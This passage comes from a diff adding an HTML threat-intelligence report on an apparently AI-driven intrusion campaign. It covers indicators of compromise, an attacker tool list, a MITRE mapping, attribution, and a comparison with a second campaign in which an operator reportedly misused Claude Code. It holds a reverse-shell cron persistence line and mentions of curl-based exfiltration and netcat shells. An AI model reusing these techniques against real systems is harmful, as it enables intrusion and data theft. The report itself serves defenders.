+  <div class="ioc-row"><span class="ioc-type">TCP/9000</span><span class="ioc-val">SimpleHTTP open directory</span><span class="ioc-desc">Python SimpleHTTP/0.6 serving 150+ campaign artefacts. No authentication.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/39999</span><span class="ioc-val">SSE simulation server</span><span class="ioc-desc">Serves cc_raw_stream.txt as server-sent events. Internal testing/replay use.</span><span class="ioc-conf"><span class="badge b-orange">High</span></span></div>
+</div>
+
+<h4>TLS certificate (port 8443)</h4>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:16px;margin:12px 0;">
+  <div class="ioc-row"><span class="ioc-type">SHA-1</span><span class="ioc-val">50441576dfa753397ce14265f08ba4220ba59a88</span><span class="ioc-desc">Certificate fingerprint (SHA-1) &mdash; use for Shodan/Censys pivot</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">MD5</span><span class="ioc-val">03a9e4d337158e22183b2ba3032080ee</span><span class="ioc-desc">Certificate fingerprint (MD5)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">CN</span><span class="ioc-val">202.61.139.15</span><span class="ioc-desc">Common name equals host IP (self-signed)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">Profile</span><span class="ioc-val">CA:TRUE &bull; RSA-2048 &bull; 2-day validity &bull; SHA256WithRSA</span><span class="ioc-desc">Automated generation pattern. Cert rotates every 2 days; SHA-1 stale after ~5 Oct 2026. Use cert shape for future infrastructure hunting.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+</div>
+
+<h4>File-based indicators</h4>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:16px;margin:12px 0;">
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">cairn_guard.sh</span><span class="ioc-desc">Cairn dispatcher memory management daemon</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">cairn_disk_guard.sh</span><span class="ioc-desc">Cairn Docker disk sweep daemon</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">i051_shock_rce.py</span><span class="ioc-desc">Custom ShellShock SMTP exploit with operator C2 hardcoded</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">MssqlProbe.java</span><span class="ioc-desc">JDBC MSSQL credential verifier using JTurbo driver</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">fix_switcher.py</span><span class="ioc-desc">Patches ClinePass account rotation service in-place</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">dump_clinepass.py</span><span class="ioc-desc">Extracts API keys from local Cairn API at 127.0.0.1:8000</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">filename</span><span class="ioc-val">webxml_dbscan.py</span><span class="ioc-desc">Scans Tomcat WEB-INF/web.xml for MODb MSSQL credentials</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">path</span><span class="ioc-val">/opt/cairn/dispatch.log</span><span class="ioc-desc">Cairn dispatcher log (229,828 lines)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">path</span><span class="ioc-val">/opt/cline-pass-switcher/server.js</span><span class="ioc-desc">ClinePass account rotation service</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">path</span><span class="ioc-val">~/.local/share/cairn/cairn.db</span><span class="ioc-desc">SQLite victim database (full manifest of 85+ targets)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">path</span><span class="ioc-val">/data/pwn.sh</span><span class="ioc-desc">Reverse shell payload on compromised K8s pod</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">cron</span><span class="ioc-val">*/5 * * * * /bin/sh /data/pwn.sh</span><span class="ioc-desc">Persistence mechanism on K8s pod</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">docker image</span><span class="ioc-val">oritera/cairn-worker-container</span><span class="ioc-desc">Kali Linux base image used for attack containers</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+</div>
+
+<h4>Actor account indicators</h4>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:16px;margin:12px 0;">
+  <div class="ioc-row"><span class="ioc-type">account ID</span><span class="ioc-val">usr-01M399PRPE49Q9Z8R513CSYGT7</span><span class="ioc-desc">ClinePass stolen subscription account 1</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">account ID</span><span class="ioc-val">usr-01M39VDXTGSNJRC8Z6CGPKFSWP</span><span class="ioc-desc">ClinePass stolen subscription account 2</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+</div>
+
+<h2 id="tools">13. Attacker Toolset</h2>
+
+<table>
+<thead><tr><th>Tool</th><th>Language</th><th>Purpose</th></tr></thead>
+<tbody>
+<tr><td><code>i051_shock_rce.py</code></td><td>Python 3</td><td>Multi-mode ShellShock over SMTP: exec, shell, revshell, listen, auto (with hardcoded callback VPS SSH creds)</td></tr>
+<tr><td><code>MssqlProbe.java</code></td><td>Java</td><td>JDBC credential verifier using JTurbo 4.0 driver; writes to /tmp/sqlprobe.out</td></tr>
+<tr><td><code>webxml_dbscan.py</code></td><td>Python 2</td><td>Extracts MODb MSSQL credentials from 11 predefined Tomcat WEB-INF/web.xml paths</td></tr>
+<tr><td><code>cred_scan.py</code></td><td>Python 2</td><td>Generic credential scanner across /etc, /usr/local, /opt; regex for JDBC, SQL Server, password patterns</td></tr>
+<tr><td><code>config_cred_scan.py</code></td><td>Python 2</td><td>Targeted config scanner for /usr/local/sms, /opt, /etc paths</td></tr>
+<tr><td><code>intra_scan.py</code></td><td>Python 2</td><td>Port scanner; targets 192.168.1.x LAN and 10.225.30.x MSSQL range; ports: 22,25,80,111,443,1433,2049,3306,5432,8080,10050</td></tr>
+<tr><td><code>intra_banner.py</code></td><td>Python 2</td><td>Banner grabber for specific hosts on 192.168.1.x and 10.225.30.x; handles SSH/HTTP/HTTPS/port-1433</td></tr>
+<tr><td><code>probe_db_hosts.py</code></td><td>Python 2</td><td>Checks 192.168.1.227 and 192.168.1.235 on port 1433</td></tr>
+<tr><td><code>enum_redis.sh</code></td><td>Bash</td><td>Post-compromise enumeration script (run via Metasploit shell); dumps id, hostname, filesystem, mounts, env vars, crontab</td></tr>
+<tr><td><code>dump_clinepass.py</code></td><td>Python 3</td><td>Reads API key inventory from Cairn API at 127.0.0.1:8000/api/provider/config</td></tr>
+<tr><td><code>fix_switcher.py</code></td><td>Python 3</td><td>Patches server.js in-place to fix header encoding bug in ClinePass rotation service</td></tr>
+<tr><td><code>save_cc_stream.py</code></td><td>Python 3</td><td>Tests CommandCode API (api.commandcode.ai); saves SSE stream to /tmp/cc_raw_stream.txt</td></tr>
+<tr><td><code>sim_server.py</code></td><td>Python 3</td><td>Serves cc_raw_stream.txt as SSE on port 39999 for local API stream replay testing</td></tr>
+<tr><td><code>live_tasks.py</code></td><td>Python 3</td><td>Reads cairn.db for active intents; cross-references Docker container pids</td></tr>
+<tr><td><code>map_intents.sh</code></td><td>Bash</td><td>Maps active intents across proj_001, proj_006, proj_008, proj_009, proj_014 via docker exec</td></tr>
+<tr><td><code>cairn_guard.sh</code></td><td>Bash</td><td>Dispatcher memory guard; defers restart until no active leases; rate-limits restart frequency</td></tr>
+<tr><td><code>cairn_disk_guard.sh</code></td><td>Bash</td><td>Docker container disk sweep; preserves attack evidence and session records; clears dictionaries and package caches</td></tr>
+</tbody>
+</table>
+
+<h2 id="mitre">14. MITRE ATT&amp;CK Mapping</h2>
+
+<table class="mitre-table">
+<thead><tr><th>Technique</th><th>Sub-technique</th><th>Evidence</th></tr></thead>
+<tbody>
+<tr><td>T1190</td><td>Exploit Public-Facing Application</td><td>ShellShock (CVE-2014-6271) via SMTP; multiple Magento CVEs attempted; SSRF via internal API endpoint</td></tr>
+<tr><td>T1059.004</td><td>Unix Shell</td><td>Bash payload via ShellShock; netcat reverse shell on K8s pod</td></tr>
+<tr><td>T1071.001</td><td>Web Protocols</td><td>Command output exfiltrated via HTTP PUT to operator listener; Cairn API over HTTP</td></tr>
+<tr><td>T1041</td><td>Exfiltration over C2 Channel</td><td>ShellShock channel uses curl -T - (chunked PUT) embedded in SMTP session</td></tr>
+<tr><td>T1053.003</td><td>Cron</td><td>Reverse shell installed as */5 cron on compromised K8s pod</td></tr>
+<tr><td>T1552.001</td><td>Credentials in Files</td><td>MSSQL credentials from /opt/web.xml; GCP SA keys from K8s env/filesystem</td></tr>
+<tr><td>T1078</td><td>Valid Accounts</td><td>Stolen Cline Pass subscriptions; Magento REST admin token; MSSQL user eu/mactytech</td></tr>
+<tr><td>T1046</td><td>Network Service Scanning</td><td>intra_scan.py against 192.168.1.x and 10.225.30.x; probe_db_hosts.py on port 1433</td></tr>
+<tr><td>T1016</td><td>System Network Configuration Discovery</td><td>/proc/net/route, /proc/net/arp, ip addr, netstat enumeration via ShellShock channel</td></tr>
+<tr><td>T1082</td><td>System Information Discovery</td><td>id, uname, hostname, ps, mount, df via ShellShock; pod enumeration via reverse shell</td></tr>
+<tr><td>T1057</td><td>Process Discovery</td><td>ps -ef, ps -eo via ShellShock; process tree enumeration</td></tr>
+<tr><td>T1083</td><td>File and Directory Discovery</td><td>find commands for JTurbo.jar, web.xml, JSP/PHP files; ls across web directories</td></tr>
+<tr><td>T1611</td><td>Escape to Host</td><td>K8s pod running as root; access to /proc, /sys, service network; reverse shell established</td></tr>
+<tr><td>T1496</td><td>Resource Hijacking</td><td>Stolen ClinePass subscriptions (~$10K credit) funding AI inference</td></tr>
+<tr><td>T1140</td><td>Deobfuscate/Decode Files</td><td>Base64-encoded PowerShell listener in sakip_i061 archive</td></tr>
+<tr><td>T1588.002</td><td>Obtain Capabilities: Tool</td><td>JTurbo JDBC driver downloaded from victim server directories; MssqlProbe.java staged on operator HTTP server</td></tr>
+<tr><td>T1102</td><td>Web Service</td><td>Operator staging directory served via Python SimpleHTTP on non-standard port; Cairn API over HTTP</td></tr>
+</tbody>
+</table>
+
+<h2 id="attribution">15. Attribution Assessment</h2>
+
+<table>
+<thead><tr><th>Attribute</th><th>Assessment</th></tr></thead>
+<tbody>
+<tr><td>Language</td><td>Simplified Chinese throughout all internal artefacts: session notes, tool comments, platform labels, API key labels, disk audit output. No Cantonese or Traditional Chinese observed. Consistent across hundreds of documents produced over 13 days.</td></tr>
+<tr><td>Hardware</td><td>Two Raspberry Pi devices (pi-workbuddy, pi-cline-deepseek) as primary attack workers. Consumer-grade hardware suggests individual or small team operator rather than nation-state infrastructure.</td></tr>
+<tr><td>AI toolchain</td><td>DeepSeek v4.1-flash via pirated ClinePass subscriptions. Operator actively maintained and debugged the rotation service mid-campaign (fix_switcher.py committed with translation: "expected exactly 1 match, abort"). Deliberate preference: account label translates as "locked to DeepSeek official" indicating the operator actively avoided model substitution.</td></tr>
+<tr><td>Targeting</td><td>Broad opportunistic scope: US e-commerce (Magento), US digital health and automotive finance, Taiwanese messaging infrastructure, UK/European multi-tenant SaaS, European outdoor equipment. No evident political or espionage motive; data stolen (payment cards, credentials, MSSQL access) aligns with financial motivation.</td></tr>
+<tr><td>OPSEC failures</td><td>Open staging directory on non-standard port; hardcoded operator SSH credentials in exploit script; short-lived self-signed TLS certificates reusing predictable generation pattern; predictable ASN clustering. These failures enabled discovery but are common for financially motivated actors without state-level OPSEC discipline.</td></tr>
+<tr><td>Known attribution</td><td>Does not match any publicly tracked group at time of writing. No shared TTPs, infrastructure, or tooling with known APT groups. Working name: UNC-CAIRN.</td></tr>
+</tbody>
+</table>
+
+<h2 id="artex">16. Comparison: UNC-CAIRN vs ARTEX</h2>
+
+<p>On 14 October 2026, Zscaler ThreatLabz published analysis of a concurrent campaign using ARTEX, an open-source agentic penetration testing framework, against South Korean financial institutions. The temporal and technical overlap warrants structured comparison.</p>
+
+<table>
+<thead><tr><th>Attribute</th><th>Operation CAIRN (UNC-CAIRN)</th><th>ARTEX Campaign (Zscaler)</th></tr></thead>
+<tbody>
+<tr><td>Primary AI model</td><td>DeepSeek v4.1-flash</td><td>DeepSeek v4.1-flash (primary) + Zhipu AI GLM-5.3 + SpaceXAI Grok 4.6</td></tr>
+<tr><td>Campaign start</td><td>24 September 2026</td><td>Late September 2026</td></tr>
+<tr><td>Language</td><td>Simplified Chinese</td><td>Chinese-speaking (assessed)</td></tr>
+<tr><td>Framework</td><td>Custom-built, not open-source</td><td>ARTEX (GitHub, developer Autumn-27; taken private post-disclosure)</td></tr>
+<tr><td>Victim scope</td><td>85+ targets, global, multi-sector</td><td>Multiple South Korean financial institutions</td></tr>
+<tr><td>Data stolen</td><td>Payment cards, credentials, GCP keys, MSSQL creds</td><td>~67,000 individuals&rsquo; PII (name, phone, income, loan limits)</td></tr>
+<tr><td>Monetisation</td><td>Not documented in recovered artefacts</td><td>Operator used Claude Code sessions to seek advice on selling stolen PII via Korean-language Telegram channels</td></tr>
+<tr><td>Platform sophistication</td><td>High (custom platform, production-grade tooling, iterative development)</td><td>Moderate (modified open-source framework)</td></tr>
+<tr><td>OPSEC</td><td>Multiple failures (open directory, hardcoded creds)</td><td>Not assessed</td></tr>
+</tbody>
+</table>
+
+<p>The most parsimonious explanation is that these are two separate Chinese-speaking actors who independently adopted agentic AI frameworks for intrusion campaigns in the same two-week window. The shared use of DeepSeek v4.1-flash and the near-identical campaign start dates are striking, but ARTEX is open-source and publicly available, while Cairn appears to be a fully custom platform with months of prior engineering. This points to parallel development by actors operating in the same underground ecosystem who independently concluded that AI-driven autonomous attack tooling was viable and cost-effective, rather than a single actor running two campaign branches.</p>
+
+<div class="alert alert-g">
+  <strong>Key takeaway for defenders:</strong> Two separate actors, both Chinese-speaking, both initiating AI-driven autonomous intrusion campaigns in the last week of September 2026 is not coincidence. It indicates an inflection point in adversarial AI adoption. Defenders should treat autonomous AI-assisted scanning, reconnaissance, and exploitation as an active and expanding threat category, not a theoretical future risk.
+</div>
+
+<hr class="section">
+
+
+</div><!-- end container -->
+
+<footer>
+  <span>Operation CAIRN &mdash; Independent Security Research &mdash; M3GATR0N &mdash; October 2026</span>
+</footer>
+
+</body>
+</html>
 
